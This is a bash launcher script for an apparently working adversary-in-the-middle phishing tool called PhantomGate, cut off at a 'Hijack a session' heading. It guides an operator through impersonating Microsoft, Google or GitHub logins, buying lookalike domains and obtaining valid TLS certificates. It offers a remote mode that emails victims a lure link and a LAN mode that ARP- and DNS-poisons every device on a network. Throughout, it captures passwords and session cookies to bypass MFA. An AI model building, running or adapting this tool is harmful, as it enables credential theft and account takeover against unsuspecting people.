#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════
#  PhantomGate — One-Command Launcher
#
#  This script asks you a few simple questions, then does
#  EVERYTHING automatically — builds, configures, and runs.
#
#  Usage:  chmod +x run.sh && sudo ./run.sh
# ═══════════════════════════════════════════════════════════════

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

cd "$(dirname "$0")"

# ───────────────────────────────────────
# Cleanup
# ───────────────────────────────────────
PIDS=()
cleanup() {
    echo ""
    echo -e "  ${YELLOW}[!] Shutting down PhantomGate...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done
    echo -e "  ${GREEN}[+] Stopped. Your captured data is saved in: ${BOLD}$STORE_FILE${NC}"
    echo ""
}
trap cleanup EXIT INT TERM

# ───────────────────────────────────────
# Helpers
# ───────────────────────────────────────
ask() {
    echo -ne "  ${CYAN}$1${NC} "
    read -r REPLY
    echo "$REPLY"
}

banner() {
    clear
    echo -e "${RED}"
    echo "   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗"
    echo "   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║"
    echo "   ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║"
    echo "   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║"
    echo "   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║"
    echo "   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝"
    echo "              ██████╗  █████╗ ████████╗███████╗"
    echo "             ██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝"
    echo "             ██║  ███╗███████║   ██║   █████╗"
    echo "             ██║   ██║██╔══██║   ██║   ██╔══╝"
    echo "             ╚██████╔╝██║  ██║   ██║   ███████╗"
    echo "              ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
}

# ═══════════════════════════════════════════════════════════════
#  START
# ═══════════════════════════════════════════════════════════════
banner

echo -e "  ${BOLD}Welcome to PhantomGate Setup${NC}"
echo -e "  ${DIM}Answer a few questions and the tool runs automatically.${NC}"
echo ""

# ───────────────────────────────────────
# QUESTION 1: What do you want to target?
# ───────────────────────────────────────
echo -e "  ${BOLD}${MAGENTA}QUESTION 1: What do you want to phish?${NC}"
echo ""
echo -e "  ${DIM}PhantomGate creates a fake version of a login page."
echo -e "  When someone logs in through it, you get their password"
echo -e "  AND their session cookies (bypasses MFA).${NC}"
echo ""

# List available phishlets
PHISHLET_FILES=(phishlets/*.yml)
declare -A PHISHLET_MAP
i=1
for yml in "${PHISHLET_FILES[@]}"; do
    name=$(grep "^name:" "$yml" | head -1 | sed 's/name: *"*//;s/"*$//')
    target=$(grep "orig_sub:" "$yml" | head -1 | sed 's/.*orig_sub: *"*//;s/"*$//')
    PHISHLET_MAP[$i]="$name"
    echo -e "    ${BOLD}[$i]${NC} $name  ${DIM}(targets: $target)${NC}"
    i=$((i + 1))
done
echo ""

while true; do
    CHOICE=$(ask "Enter number [1-$((i-1))]:")
    if [[ "$CHOICE" =~ ^[0-9]+$ ]] && [ "$CHOICE" -ge 1 ] && [ "$CHOICE" -lt "$i" ]; then
        SELECTED_PHISHLET="${PHISHLET_MAP[$CHOICE]}"
        break
    fi
    echo -e "  ${RED}Invalid choice. Try again.${NC}"
done

echo -e "  ${GREEN}[+] Selected: $SELECTED_PHISHLET${NC}"
echo ""

# ───────────────────────────────────────
# QUESTION 2: Mode — local test or real attack?
# ───────────────────────────────────────
echo -e "  ${BOLD}${MAGENTA}QUESTION 2: What mode do you want to run?${NC}"
echo ""
echo -e "    ${BOLD}[1]${NC} Local Test Mode       ${DIM}(safe practice on your machine, no domain needed)${NC}"
echo -e "    ${BOLD}[2]${NC} Remote Phishing Mode  ${DIM}(needs a domain + VPS, victim clicks a link)${NC}"
echo -e "    ${BOLD}[3]${NC} LAN Interception Mode ${DIM}(ARP + DNS poison, victims on same WiFi/network)${NC}"
echo ""
echo -e "  ${DIM}Mode 1: You test locally with a fake server"
echo -e "  Mode 2: You send a phishing link, victim clicks it from anywhere on the internet"
echo -e "  Mode 3: You're on the same network as the victim (same WiFi, office, etc)."
echo -e "          No domain needed — DNS poisoning redirects their traffic to you.${NC}"
echo ""

while true; do
    MODE=$(ask "Enter number [1-3]:")
    if [ "$MODE" = "1" ] || [ "$MODE" = "2" ] || [ "$MODE" = "3" ]; then
        break
    fi
    echo -e "  ${RED}Invalid choice. Enter 1, 2, or 3.${NC}"
done

# ───────────────────────────────────────
# MODE 1: LOCAL TEST
# ───────────────────────────────────────
if [ "$MODE" = "1" ]; then
    echo ""
    echo -e "  ${GREEN}[+] Local Test Mode selected${NC}"
    echo ""
    echo -e "  ${DIM}This runs everything on your machine using a fake login server."
    echo -e "  No domain, no internet, no real targets — just a safe simulation.${NC}"
    echo ""

    DOMAIN="test.local"
    HTTPS_PORT=8443
    HTTP_PORT=8080
    ADMIN_PORT=9443
    ADMIN_PASS="admin-$(date +%s | tail -c 6)"
    STORE_FILE="data/test_$(date +%Y%m%d_%H%M%S).json"
    USE_LOCAL_TARGET=true

    # Password
    echo -e "  ${BOLD}${MAGENTA}QUESTION 3: Dashboard password${NC}"
    echo -e "  ${DIM}This protects the operator panel where you see stolen credentials.${NC}"
    echo ""
    CUSTOM_PASS=$(ask "Enter a password (or press Enter for auto-generated):")
    if [ -n "$CUSTOM_PASS" ]; then
        ADMIN_PASS="$CUSTOM_PASS"
    fi
    echo -e "  ${GREEN}[+] Password: $ADMIN_PASS${NC}"
    echo ""

fi

# ───────────────────────────────────────
# MODE 2: REAL ATTACK
# ───────────────────────────────────────
if [ "$MODE" = "2" ]; then
    echo ""
    echo -e "  ${GREEN}[+] Real Attack Mode selected${NC}"
    echo ""

    # Check root
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "  ${RED}[!] Real attack mode needs root (for ports 80/443 and cert fetching).${NC}"
        echo -e "  ${BOLD}    Re-run with: sudo ./run.sh${NC}"
        exit 1
    fi

    # Explain domain
    echo -e "  ${BOLD}${MAGENTA}QUESTION 3: Your phishing domain${NC}"
    echo ""
    echo -e "  ${CYAN}What is a domain?${NC}"
    echo -e "  ${DIM}A domain is a website address that YOU own."
    echo -e "  Example: \"login-secure.com\" or \"office-auth.net\"${NC}"
    echo ""
    echo -e "  ${CYAN}How to get one (takes 2 minutes):${NC}"
    echo -e "  ${DIM}  1. Go to namecheap.com or cloudflare.com/products/registrar${NC}"
    echo -e "  ${DIM}  2. Search for a domain that looks legit (costs ~\$1-10/year):${NC}"
    echo -e "       ${DIM}For Microsoft 365:  microsoftonline-auth.com, office-secure.net${NC}"
    echo -e "       ${DIM}For Google:          accounts-verify.com, google-auth.net${NC}"
    echo -e "       ${DIM}For GitHub:          github-security.com, git-verify.net${NC}"
    echo -e "  ${DIM}  3. Buy it, then go to DNS settings and add these 2 records:${NC}"
    echo ""
    echo -e "       ${BOLD}Type: A   |  Name: *   |  Value: $(curl -s ifconfig.me 2>/dev/null || echo '<your-server-IP>')${NC}"
    echo -e "       ${BOLD}Type: A   |  Name: @   |  Value: $(curl -s ifconfig.me 2>/dev/null || echo '<your-server-IP>')${NC}"
    echo ""
    echo -e "  ${DIM}  This makes all subdomains point to this server.${NC}"
    echo -e "  ${DIM}  Wait 2-5 minutes for DNS to update, then come back here.${NC}"
    echo ""

    while true; do
        DOMAIN=$(ask "Enter your domain (e.g., login-secure.com):")
        if [ -n "$DOMAIN" ] && [[ "$DOMAIN" == *.* ]]; then
            break
        fi
        echo -e "  ${RED}Enter a valid domain like: login-secure.com${NC}"
    done
    echo -e "  ${GREEN}[+] Domain: $DOMAIN${NC}"
    echo ""

    # Verify DNS points to us
    echo -e "  ${DIM}[*] Checking if DNS for $DOMAIN points to this server...${NC}"
    MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "")
    DOMAIN_IP=$(dig +short "$DOMAIN" 2>/dev/null | tail -1)

    if [ -n "$MY_IP" ] && [ -n "$DOMAIN_IP" ]; then
        if [ "$MY_IP" = "$DOMAIN_IP" ]; then
            echo -e "  ${GREEN}[+] DNS is correct: $DOMAIN → $MY_IP${NC}"
        else
            echo -e "  ${YELLOW}[!] WARNING: $DOMAIN points to $DOMAIN_IP but this server is $MY_IP${NC}"
            echo -e "  ${YELLOW}    Certificate fetching and attacks will FAIL until DNS is fixed.${NC}"
            echo -e "  ${DIM}    Update your DNS A record to point to $MY_IP and wait a few minutes.${NC}"
            echo ""
            DNS_OK=$(ask "Continue anyway? (y/n):")
            if [ "$DNS_OK" != "y" ] && [ "$DNS_OK" != "Y" ]; then
                echo -e "  ${DIM}Fix DNS and re-run this script.${NC}"
                exit 0
            fi
        fi
    else
        echo -e "  ${YELLOW}[!] Could not verify DNS (no internet or dig not installed). Continuing...${NC}"
    fi
    echo ""

    # Password
    echo -e "  ${BOLD}${MAGENTA}QUESTION 4: Dashboard password${NC}"
    echo -e "  ${DIM}This protects the panel where you see stolen credentials + sessions.${NC}"
    echo ""
    ADMIN_PASS="pg-$(head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 10)"
    CUSTOM_PASS=$(ask "Enter a password (or press Enter for auto: $ADMIN_PASS):")
    if [ -n "$CUSTOM_PASS" ]; then
        ADMIN_PASS="$CUSTOM_PASS"
    fi
    echo -e "  ${GREEN}[+] Password: $ADMIN_PASS${NC}"
    echo ""

    # That's it — everything else is automatic
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}  All questions answered. Automating everything now...${NC}"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    HTTPS_PORT=443
    HTTP_PORT=80
    ADMIN_PORT=8443
    STORE_FILE="data/attack_$(date +%Y%m%d_%H%M%S).json"
    USE_LOCAL_TARGET=false

    # ─── AUTO-FETCH TLS CERTIFICATE ───
    # Kill anything on port 80 first (certbot needs it)
    PORT80_PID=$(ss -tlnp 2>/dev/null | grep ":80 " | grep -oP 'pid=\K[0-9]+' | head -1)
    if [ -n "$PORT80_PID" ]; then
        echo -e "  ${DIM}[*] Freeing port 80 (killing PID $PORT80_PID)...${NC}"
        kill "$PORT80_PID" 2>/dev/null || true
        sleep 1
    fi

    CERT_ARGS=""
    CERT_PATH="/etc/letsencrypt/live/$DOMAIN"

    # Check if we already have a valid cert for this domain
    if [ -f "$CERT_PATH/fullchain.pem" ] && [ -f "$CERT_PATH/privkey.pem" ]; then
        # Check expiry
        EXPIRY=$(openssl x509 -enddate -noout -in "$CERT_PATH/fullchain.pem" 2>/dev/null | cut -d= -f2)
        if openssl x509 -checkend 86400 -noout -in "$CERT_PATH/fullchain.pem" 2>/dev/null; then
            echo -e "  ${GREEN}[+] Existing TLS certificate found (expires: $EXPIRY)${NC}"
            CERT_ARGS="--cert $CERT_PATH/fullchain.pem --key $CERT_PATH/privkey.pem"
        else
            echo -e "  ${YELLOW}[!] Existing certificate expired. Renewing...${NC}"
            certbot renew --non-interactive 2>/dev/null
            if [ -f "$CERT_PATH/fullchain.pem" ]; then
                CERT_ARGS="--cert $CERT_PATH/fullchain.pem --key $CERT_PATH/privkey.pem"
                echo -e "  ${GREEN}[+] Certificate renewed${NC}"
            fi
        fi
    fi

    # No existing cert — fetch a new one
    if [ -z "$CERT_ARGS" ]; then
        echo -e "  ${DIM}[*] Fetching free TLS certificate from Let's Encrypt...${NC}"
        echo -e "  ${DIM}    (this makes the site show https:// with a padlock — no browser warnings)${NC}"

        # Install certbot if missing
        if ! command -v certbot &>/dev/null; then
            echo -e "  ${DIM}[*] Installing certbot...${NC}"
            if command -v apt-get &>/dev/null; then
                apt-get update -qq && apt-get install -y -qq certbot >/dev/null 2>&1
            elif command -v dnf &>/dev/null; then
                dnf install -y -q certbot >/dev/null 2>&1
            elif command -v yum &>/dev/null; then
                yum install -y -q certbot >/dev/null 2>&1
            elif command -v pip3 &>/dev/null; then
                pip3 install certbot -q >/dev/null 2>&1
            fi

            if ! command -v certbot &>/dev/null; then
                echo -e "  ${YELLOW}[!] Could not install certbot automatically.${NC}"
                echo -e "  ${DIM}    Install it manually: apt install certbot${NC}"
                echo -e "  ${DIM}    Falling back to self-signed cert (browser will show warning).${NC}"
            fi
        fi

        if command -v certbot &>/dev/null; then
            # Get the required subdomains from the phishlet
            CERT_DOMAINS="-d $DOMAIN"
            for yml in phishlets/*.yml; do
                pname=$(grep "^name:" "$yml" | head -1 | sed 's/name: *"*//;s/"*$//')
                if [ "$pname" = "$SELECTED_PHISHLET" ]; then
                    while IFS= read -r line; do
                        sub=$(echo "$line" | sed 's/.*phish_sub: *"*//;s/"*$//')
                        CERT_DOMAINS="$CERT_DOMAINS -d ${sub}.${DOMAIN}"
                    done < <(grep "phish_sub:" "$yml")
                    break
                fi
            done

            echo -e "  ${DIM}[*] Requesting cert for: $CERT_DOMAINS${NC}"

            # shellcheck disable=SC2086
            if certbot certonly --standalone --non-interactive --agree-tos \
                --register-unsafely-without-email \
                $CERT_DOMAINS 2>/tmp/certbot_output.log; then

                if [ -f "$CERT_PATH/fullchain.pem" ]; then
                    CERT_ARGS="--cert $CERT_PATH/fullchain.pem --key $CERT_PATH/privkey.pem"
                    echo -e "  ${GREEN}[+] TLS certificate obtained — HTTPS padlock will show${NC}"
                else
                    # Sometimes certbot saves under a different name
                    ALT_PATH=$(find /etc/letsencrypt/live/ -name "fullchain.pem" 2>/dev/null | head -1)
                    if [ -n "$ALT_PATH" ]; then
                        ALT_DIR=$(dirname "$ALT_PATH")
                        CERT_ARGS="--cert $ALT_DIR/fullchain.pem --key $ALT_DIR/privkey.pem"
                        echo -e "  ${GREEN}[+] TLS certificate obtained (saved at $ALT_DIR)${NC}"
                    fi
                fi
            else
                echo -e "  ${YELLOW}[!] Certificate request failed. Common reasons:${NC}"
                echo -e "  ${DIM}    - DNS for $DOMAIN doesn't point to this server yet${NC}"
                echo -e "  ${DIM}    - Port 80 is blocked by firewall${NC}"
                echo -e "  ${DIM}    - Rate limited (too many requests to Let's Encrypt)${NC}"
                echo -e "  ${DIM}    Error log: /tmp/certbot_output.log${NC}"
                echo -e "  ${DIM}    Continuing with self-signed cert (browser will show warning).${NC}"
            fi
        fi
    fi
    echo ""
fi

# ───────────────────────────────────────
# MODE 3: LAN INTERCEPTION (ARP + DNS POISONING)
# ───────────────────────────────────────
if [ "$MODE" = "3" ]; then
    echo ""
    echo -e "  ${GREEN}[+] LAN Interception Mode selected${NC}"
    echo ""

    # Check root
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "  ${RED}[!] LAN interception needs root (for raw sockets + IP forwarding).${NC}"
        echo -e "  ${BOLD}    Re-run with: sudo ./run.sh${NC}"
        exit 1
    fi

    echo -e "  ${CYAN}How this works:${NC}"
    echo -e "  ${DIM}  1. ARP Poisoning: We trick devices on the network into thinking${NC}"
    echo -e "  ${DIM}     WE are the router. Their traffic flows through us.${NC}"
    echo -e "  ${DIM}  2. DNS Poisoning: When a victim looks up \"login.microsoftonline.com\",${NC}"
    echo -e "  ${DIM}     we reply with OUR IP address instead of Microsoft's.${NC}"
    echo -e "  ${DIM}  3. The victim's browser connects to us. We show the REAL login page${NC}"
    echo -e "  ${DIM}     (reverse proxy) and capture credentials + session cookies.${NC}"
    echo ""
    echo -e "  ${YELLOW}Requirements:${NC}"
    echo -e "  ${DIM}  - You must be on the same network (WiFi/LAN) as the victim${NC}"
    echo -e "  ${DIM}  - No domain needed — DNS poisoning does the redirect${NC}"
    echo -e "  ${DIM}  - Works against any device on the network (phones, laptops, etc)${NC}"
    echo ""

    # Auto-detect network
    echo -e "  ${DIM}[*] Auto-detecting network...${NC}"
    echo ""

    # Get gateway
    GATEWAY_IP=$(ip route show default 2>/dev/null | awk '/default/ {print $3}' | head -1)
    IFACE=$(ip route show default 2>/dev/null | awk '/default/ {print $5}' | head -1)
    LOCAL_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)
    SUBNET=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d./]+' | head -1)

    if [ -z "$GATEWAY_IP" ] || [ -z "$IFACE" ] || [ -z "$LOCAL_IP" ]; then
        echo -e "  ${RED}[!] Could not auto-detect network. Make sure you're connected.${NC}"
        exit 1
    fi

    IS_WIFI="Wired"
    [ -d "/sys/class/net/$IFACE/wireless" ] && IS_WIFI="WiFi"

    echo -e "  ${GREEN}[+] Network detected:${NC}"
    echo -e "      Interface : ${BOLD}$IFACE${NC} ($IS_WIFI)"
    echo -e "      Your IP   : ${BOLD}$LOCAL_IP${NC}"
    echo -e "      Gateway   : ${BOLD}$GATEWAY_IP${NC}"
    echo -e "      Subnet    : ${BOLD}$SUBNET${NC}"
    echo ""

    # Victim scope
    echo -e "  ${BOLD}${MAGENTA}QUESTION 3: Who do you want to target?${NC}"
    echo ""
    echo -e "    ${BOLD}[1]${NC} Everyone on the network  ${DIM}(all devices on this WiFi/LAN)${NC}"
    echo -e "    ${BOLD}[2]${NC} Specific IP only         ${DIM}(target one device)${NC}"
    echo ""

    while true; do
        SCOPE_CHOICE=$(ask "Enter number [1-2]:")
        if [ "$SCOPE_CHOICE" = "1" ] || [ "$SCOPE_CHOICE" = "2" ]; then
            break
        fi
    done

    VICTIM_FLAG=""
    if [ "$SCOPE_CHOICE" = "2" ]; then
        VICTIM_IP=$(ask "Enter victim's IP address:")
        VICTIM_FLAG="--victim-ip $VICTIM_IP"
        echo -e "  ${GREEN}[+] Targeting: $VICTIM_IP${NC}"
    else
        echo -e "  ${GREEN}[+] Targeting: entire subnet${NC}"
    fi
    echo ""

    # Dashboard password
    echo -e "  ${BOLD}${MAGENTA}QUESTION 4: Dashboard password${NC}"
    echo -e "  ${DIM}Protects the panel where you see stolen credentials.${NC}"
    echo ""
    ADMIN_PASS="pg-$(head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 10)"
    CUSTOM_PASS=$(ask "Enter a password (or press Enter for auto: $ADMIN_PASS):")
    if [ -n "$CUSTOM_PASS" ]; then
        ADMIN_PASS="$CUSTOM_PASS"
    fi
    echo -e "  ${GREEN}[+] Password: $ADMIN_PASS${NC}"
    echo ""

    # LAN mode uses self-signed cert (no domain = can't get Let's Encrypt)
    # The ARP+DNS poisoning makes victims think they're on the real site
    DOMAIN="lan.local"
    HTTPS_PORT=443
    HTTP_PORT=80
    ADMIN_PORT=8443
    STORE_FILE="data/lan_$(date +%Y%m%d_%H%M%S).json"
    USE_LOCAL_TARGET=false
    CERT_ARGS=""
    LAN_MODE=true
    LAN_IFACE="$IFACE"
    LAN_GATEWAY="$GATEWAY_IP"
    LAN_VICTIM_FLAG="$VICTIM_FLAG"
fi

# ═══════════════════════════════════════════════════════════════
#  AUTO-BUILD
# ═══════════════════════════════════════════════════════════════
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${BOLD}Setting up... (fully automatic from here)${NC}"
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Check Go
if ! command -v go &>/dev/null; then
    echo -e "  ${RED}[!] Go is not installed.${NC}"
    echo -e "  ${DIM}Install it:${NC}"
    echo -e "    ${BOLD}wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz${NC}"
    echo -e "    ${BOLD}sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz${NC}"
    echo -e "    ${BOLD}export PATH=\$PATH:/usr/local/go/bin${NC}"
    exit 1
fi

# Always rebuild to pick up latest changes
echo -e "  ${DIM}[*] Building PhantomGate...${NC}"
mkdir -p bin
go build -ldflags "-s -w" -o bin/phantomgate ./cmd/phantomgate
echo -e "  ${GREEN}[+] Binary built${NC}"

# Build fake target for local mode
if [ "$USE_LOCAL_TARGET" = true ]; then
    if [ ! -f "bin/fake_target" ]; then
        echo -e "  ${DIM}[*] Building test server...${NC}"
        go build -o bin/fake_target ./test/fake_target
    fi
    echo -e "  ${GREEN}[+] Test server ready${NC}"
fi

# Create data directory
mkdir -p data

# ═══════════════════════════════════════════════════════════════
#  KILL CONFLICTING PROCESSES
# ═══════════════════════════════════════════════════════════════
for port in $HTTPS_PORT $HTTP_PORT $ADMIN_PORT; do
    PID_ON_PORT=$(ss -tlnp 2>/dev/null | grep ":${port} " | grep -oP 'pid=\K[0-9]+' | head -1)
    if [ -n "$PID_ON_PORT" ]; then
        echo -e "  ${YELLOW}[!] Killing process on port $port (PID $PID_ON_PORT)${NC}"
        kill "$PID_ON_PORT" 2>/dev/null || true
        sleep 0.5
    fi
done

if [ "$USE_LOCAL_TARGET" = true ]; then
    PID_ON_9999=$(ss -tlnp 2>/dev/null | grep ":9999 " | grep -oP 'pid=\K[0-9]+' | head -1)
    if [ -n "$PID_ON_9999" ]; then
        kill "$PID_ON_9999" 2>/dev/null || true
        sleep 0.5
    fi
fi

# ═══════════════════════════════════════════════════════════════
#  START SERVICES
# ═══════════════════════════════════════════════════════════════

# Start fake target in local mode
if [ "$USE_LOCAL_TARGET" = true ]; then
    echo -e "  ${DIM}[*] Starting fake login server on port 9999...${NC}"
    ./bin/fake_target &>/dev/null &
    PIDS+=($!)
    sleep 1

    if curl -s http://127.0.0.1:9999/login | grep -q "Login Portal"; then
        echo -e "  ${GREEN}[+] Fake login server running${NC}"
    else
        echo -e "  ${RED}[!] Fake login server failed to start${NC}"
        exit 1
    fi
fi

# Start PhantomGate
echo -e "  ${DIM}[*] Starting PhantomGate...${NC}"

PG_CMD=(./bin/phantomgate
    --domain "$DOMAIN"
    --phishlet "$SELECTED_PHISHLET"
    --https-port "$HTTPS_PORT"
    --http-port "$HTTP_PORT"
    --admin-port "$ADMIN_PORT"
    --admin-pass "$ADMIN_PASS"
    --phishlet-dir phishlets
    --store "$STORE_FILE"
)

# Add cert args if present
if [ -n "$CERT_ARGS" ]; then
    # shellcheck disable=SC2206
    PG_CMD+=($CERT_ARGS)
fi

# Add LAN interception flags — Go binary auto-detects interface + gateway
if [ "${LAN_MODE:-false}" = true ]; then
    PG_CMD+=(--intercept)
    if [ -n "$LAN_VICTIM_FLAG" ]; then
        # shellcheck disable=SC2206
        PG_CMD+=($LAN_VICTIM_FLAG)
    fi
fi

"${PG_CMD[@]}" &>/tmp/phantomgate_run.log &
PIDS+=($!)
sleep 2

# Verify PhantomGate started
if [ "$USE_LOCAL_TARGET" = true ]; then
    # Get the phish hostname from the phishlet
    FIRST_SUB=$(grep "phish_sub:" "phishlets/$(echo "$SELECTED_PHISHLET" | tr '[:upper:]' '[:lower:]' | tr ' ' '_').yml" 2>/dev/null | head -1 | sed 's/.*phish_sub: *"*//;s/"*$//' || echo "app")
    PHISH_HOST="${FIRST_SUB}.${DOMAIN}"

    if curl -sk --resolve "${PHISH_HOST}:${HTTPS_PORT}:127.0.0.1" \
        "https://${PHISH_HOST}:${HTTPS_PORT}/" -o /dev/null 2>/dev/null; then
        echo -e "  ${GREEN}[+] PhantomGate proxy is running${NC}"
    else
        echo -e "  ${YELLOW}[!] Proxy started but test request failed (may be normal for non-test phishlets)${NC}"
    fi
else
    if ss -tlnp 2>/dev/null | grep -q ":${HTTPS_PORT} "; then
        echo -e "  ${GREEN}[+] PhantomGate proxy is running on port $HTTPS_PORT${NC}"
    else
        echo -e "  ${RED}[!] PhantomGate failed to start. Check /tmp/phantomgate_run.log${NC}"
        cat /tmp/phantomgate_run.log | tail -5
        exit 1
    fi
fi

# ═══════════════════════════════════════════════════════════════
#  GENERATE LURE URL
# ═══════════════════════════════════════════════════════════════

# Get landing path from phishlet
LANDING_PATH=$(grep "landing_path:" -A 1 phishlets/*.yml 2>/dev/null | grep "\"/" | head -1 | sed 's/.*"\(\/[^"]*\)".*/\1/' || echo "/")

# Build the phishing URL
FIRST_PROXY_HOST=""
for yml in phishlets/*.yml; do
    pname=$(grep "^name:" "$yml" | head -1 | sed 's/name: *"*//;s/"*$//')
    if [ "$pname" = "$SELECTED_PHISHLET" ]; then
        FIRST_SUB=$(grep "phish_sub:" "$yml" | head -1 | sed 's/.*phish_sub: *"*//;s/"*$//')
        FIRST_PROXY_HOST="${FIRST_SUB}.${DOMAIN}"
        LANDING_PATH=$(grep -A 5 "landing_path:" "$yml" | grep '"/' | head -1 | sed 's/.*"\(\/[^"]*\)".*/\1/')
        [ -z "$LANDING_PATH" ] && LANDING_PATH="/"
        break
    fi
done

if [ "$HTTPS_PORT" = "443" ]; then
    PHISH_URL="https://${FIRST_PROXY_HOST}${LANDING_PATH}"
else
    PHISH_URL="https://${FIRST_PROXY_HOST}:${HTTPS_PORT}${LANDING_PATH}"
fi

# ═══════════════════════════════════════════════════════════════
#  READY — SHOW STATUS
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "  ${GREEN}${BOLD}================================================================${NC}"
echo -e "  ${GREEN}${BOLD}  PHANTOMGATE IS LIVE${NC}"
echo -e "  ${GREEN}${BOLD}================================================================${NC}"
echo ""
echo -e "  ${BOLD}Target:${NC}          $SELECTED_PHISHLET"
echo -e "  ${BOLD}Phishing Domain:${NC} $DOMAIN"
echo -e "  ${BOLD}Phishing URL:${NC}    ${CYAN}$PHISH_URL${NC}"
echo ""
echo -e "  ${BOLD}Dashboard:${NC}       ${CYAN}http://127.0.0.1:$ADMIN_PORT${NC}"
echo -e "  ${BOLD}Password:${NC}        ${BOLD}$ADMIN_PASS${NC}"
echo -e "  ${BOLD}Data File:${NC}       $STORE_FILE"
echo ""

if [ "$USE_LOCAL_TARGET" = true ]; then
    echo -e "  ${YELLOW}${BOLD}LOCAL TEST MODE${NC}"
    echo -e "  ${DIM}To test, run this in another terminal:${NC}"
    echo ""
    echo -e "    ${BOLD}# Visit the phishing page:${NC}"
    echo -e "    curl -sk --resolve ${FIRST_PROXY_HOST}:${HTTPS_PORT}:127.0.0.1 '${PHISH_URL}'"
    echo ""
    echo -e "    ${BOLD}# Submit fake credentials (simulates a victim):${NC}"
    echo -e "    curl -sk --resolve ${FIRST_PROXY_HOST}:${HTTPS_PORT}:127.0.0.1 \\"
    echo -e "      -X POST '${PHISH_URL}' \\"
    echo -e "      -d 'username=victim@corp.com&password=P@ssw0rd123' \\"
    echo -e "      -H 'Content-Type: application/x-www-form-urlencoded'"
    echo ""
    echo -e "    ${BOLD}# Check what was captured:${NC}"
    echo -e "    curl -s http://127.0.0.1:${ADMIN_PORT}/api/victims -H 'X-Admin-Token: ${ADMIN_PASS}'"
    echo ""
elif [ "${LAN_MODE:-false}" = true ]; then
    echo -e "  ${RED}${BOLD}LAN INTERCEPTION MODE — ARP + DNS POISONING ACTIVE${NC}"
    echo ""
    echo -e "  ${BOLD}Interface:${NC}  $LAN_IFACE"
    echo -e "  ${BOLD}Gateway:${NC}    $LAN_GATEWAY"
    if [ -n "$LAN_VICTIM_FLAG" ]; then
        echo -e "  ${BOLD}Target:${NC}     $VICTIM_IP"
    else
        echo -e "  ${BOLD}Target:${NC}     Entire subnet"
    fi
    echo ""
    echo -e "  ${DIM}Victims' DNS is being poisoned in real-time."
    echo -e "  When they visit $SELECTED_PHISHLET, they'll connect to PhantomGate."
    echo -e "  Their credentials and session cookies will appear on the dashboard.${NC}"
    echo ""
    echo -e "  ${YELLOW}No link to send — victims are redirected automatically via DNS.${NC}"
    echo ""
else
    echo -e "  ${RED}${BOLD}REMOTE PHISHING MODE — SEND THIS LINK TO THE TARGET:${NC}"
    echo ""
    echo -e "    ${CYAN}${BOLD}$PHISH_URL${NC}"
    echo ""
    echo -e "  ${DIM}When they click it and log in, their credentials and session"
    echo -e "  cookies appear on the dashboard automatically.${NC}"
    echo ""
    echo -e "  ${BOLD}DNS Checklist:${NC}"
    echo -e "    ${DIM}Make sure these DNS records exist:${NC}"

    # Show required DNS records
    for yml in phishlets/*.yml; do
        pname=$(grep "^name:" "$yml" | head -1 | sed 's/name: *"*//;s/"*$//')
        if [ "$pname" = "$SELECTED_PHISHLET" ]; then
            grep "phish_sub:" "$yml" | while read -r line; do
                sub=$(echo "$line" | sed 's/.*phish_sub: *"*//;s/"*$//')
                echo -e "      A  ${BOLD}${sub}.${DOMAIN}${NC}  →  ${BOLD}<this-server-IP>${NC}"
            done
            break
        fi
    done
    echo ""
fi

echo -e "  ${BOLD}How to read captured data:${NC}"
echo ""
echo -e "    ${BOLD}1. Open Dashboard:${NC} http://127.0.0.1:$ADMIN_PORT"
echo -e "       Enter password: $ADMIN_PASS"
echo ""
echo -e "    ${BOLD}2. API (command line):${NC}"
echo -e "       ${DIM}Stats:${NC}   curl -s http://127.0.0.1:$ADMIN_PORT/api/stats -H 'X-Admin-Token: $ADMIN_PASS'"
echo -e "       ${DIM}Victims:${NC} curl -s http://127.0.0.1:$ADMIN_PORT/api/victims -H 'X-Admin-Token: $ADMIN_PASS'"
echo ""
echo -e "    ${BOLD}3. Hijack a session:${NC}"
